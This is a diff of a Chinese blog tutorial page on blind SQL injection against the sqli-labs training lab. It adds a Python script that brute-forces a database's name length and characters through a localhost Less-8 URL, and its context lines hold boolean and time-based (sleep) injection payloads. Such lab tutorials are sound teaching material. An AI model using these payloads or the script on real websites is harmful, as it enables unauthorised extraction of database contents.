@@ -26,7 +26,7 @@
 <meta property="og:image" content="http://example.com/2021/06/21/SQL%E6%B3%A8%E5%85%A5-2/12.png">
 <meta property="og:image" content="http://example.com/2021/06/21/SQL%E6%B3%A8%E5%85%A5-2/13.png">
 <meta property="article:published_time" content="2021-06-21T07:22:40.000Z">
-<meta property="article:modified_time" content="2021-06-21T08:03:04.188Z">
+<meta property="article:modified_time" content="2021-06-21T08:28:39.568Z">
 <meta property="article:author" content="wsoney">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/2021/06/21/SQL%E6%B3%A8%E5%85%A5-2/sql1.png">
@@ -151,7 +151,13 @@
 <p>id =1‘ and ascii（substr（（select column_name from information_schema. columns w~here TABLE_name = ‘your table’ and table_schema = ‘security’ limit 0,1），1，1））&gt;1 </p>
 <p>这个没有实操</p>
 <p>总之通过布尔盲注就是通过不断地试错，通过猜来得到你想要的信息，过程比较复杂。</p>
-<p>可以结合着python脚本来进行，会更方便快捷。这里以后会写一个的。</p>
+<p>可以结合着python脚本来进行，会更方便快捷。</p>
+<p>这是一个简单的爆数据库名的长度和名字的python脚本：</p>
+<p>其余的可以在此基础上做修改。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import requests</span><br><span class="line">def database_length():</span><br><span class="line">	for i in range(1,10):</span><br><span class="line">		url = &#x27;&#x27;&#x27;http://localhost/sqli-labs-master/Less-8/&#x27;&#x27;&#x27;</span><br><span class="line">		payload = &#x27;&#x27;&#x27;?id=1&#x27; and length(database())&gt;%s&#x27;&#x27;&#x27; %i</span><br><span class="line">		r = requests.get(url+payload+&#x27;%23&#x27;)</span><br><span class="line">		if &#x27;You are in&#x27; in r.text:</span><br><span class="line">			print(i)</span><br><span class="line">		else:</span><br><span class="line">			print(&#x27;database_length:&#x27;,i)</span><br><span class="line">			break</span><br><span class="line">database_length()</span><br><span class="line"> </span><br><span class="line">def database_name():</span><br><span class="line">	name = &#x27;&#x27;</span><br><span class="line">	for j in range(1,9):</span><br><span class="line">		for i in &#x27;sqcwertyuioplkjhgfdazxvbnm&#x27;:</span><br><span class="line">			url = &quot;http://localhost/sqli-labs-master/Less-8/?id=1&#x27; and substr(database(),%d,1)=&#x27;%s&#x27;&quot; %(j,i)</span><br><span class="line">			</span><br><span class="line">			r = requests.get(url+&#x27;%23&#x27;)</span><br><span class="line">			if &#x27;You are in&#x27; in r.text:</span><br><span class="line">				name = name+i</span><br><span class="line">				print(name)</span><br><span class="line">				break</span><br><span class="line">	print(&#x27;database_name:&#x27;,name)</span><br><span class="line">	</span><br><span class="line">		</span><br><span class="line">	</span><br><span class="line">database_name()</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+
+
+
 <h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>​       时间型的注入遇到的条件更为苛刻，数据交互完成以后目标网站<strong>没有错误和正确的页面回显</strong>，这种情况我们可以利用<strong>时间函数</strong>来判断数据有没有在目标数据中得到执行。需要设置正确的时间延迟。</p>
 <p>函数   除其他盲注函数外    时间盲注的核心函数：sleep()。同时可以利用if判断函数结合。</p>
 <p>本次实例为sqli -labs第九关。</p>
@@ -163,7 +169,7 @@
 <p>?id=1’and if(ascii(substr((select database()),1,1))&gt;114,sleep(2),0)  –+</p>
 <p>同样可以通过其ASCII码值来判断其首字母。</p>
 <p><img src="/2021/06/21/SQL%E6%B3%A8%E5%85%A5-2/13.png" alt="13"></p>
-<p>布尔盲注和时间盲注在语使用条件上和一些必要的函数使用上是十分相像的。只是要求其产生的回显反馈不同。在这里就不赘述了，以后遇到太大的不同的话会补充的。</p>
+<p>布尔盲注和时间盲注在语使用条件上和一些必要的函数使用上是十分相像的。只是要求其产生的回显反馈不同。在这里就不赘述了，以后遇到太大的不同的话会补充的。脚本也同样可用。只需要修改一下判断条件就行。</p>
 <h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p><strong>概念</strong></p>
 <p>利用报错的信息来回显我们想要查询的信息</p>
 <p>**过程 **</p>
@@ -176,7 +182,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/06/21/SQL%E6%B3%A8%E5%85%A5-2/" data-id="ckq6c1fqp000048vi77alc18j" data-title="SQL注入-2" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/06/21/SQL%E6%B3%A8%E5%85%A5-2/" data-id="ckq6cy0sq0000t8vicvzmdwjv" data-title="SQL注入-2" class="article-share-link">Share</a>
       
       
       
